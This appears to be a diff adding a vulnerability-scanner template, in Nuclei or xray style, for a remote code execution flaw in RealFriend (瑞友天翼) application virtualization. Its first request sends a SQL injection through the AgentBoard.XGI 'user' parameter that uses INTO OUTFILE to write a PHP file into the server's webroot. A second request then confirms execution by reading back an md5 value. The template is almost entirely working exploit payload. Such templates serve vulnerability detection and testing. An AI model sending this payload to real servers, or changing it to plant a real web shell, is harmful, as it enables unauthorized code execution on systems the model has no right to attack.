@@ -1,0 +1,43 @@
+id: poc-yaml-gwt-system-agentboard-xgi-rce
+info:
+  name: 瑞友天翼应用虚拟化系统 AgentBoard.XGI 远程代码执行漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    瑞友天翼应用虚拟化系统存在远程代码执行漏洞，攻击者可以利用该漏洞执行任意代码。
+
+variables:
+  t1: '{{rand_int(1000, 10000)}}'
+  t2: '{{md5(t1)}}'
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-rce-payload
+    method: GET
+    path:
+      - "{{BaseURL}}/AgentBoard.XGI?user=123'union+select+1,'<?php+echo+md5({{t1}});?>'+INTO+OUTFILE+'C:/Program+Files+(x86)/RealFriend/Rap+Server/WebRoot/{{t1}}.XGI'--+"
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-rce-payload
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.XGI"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
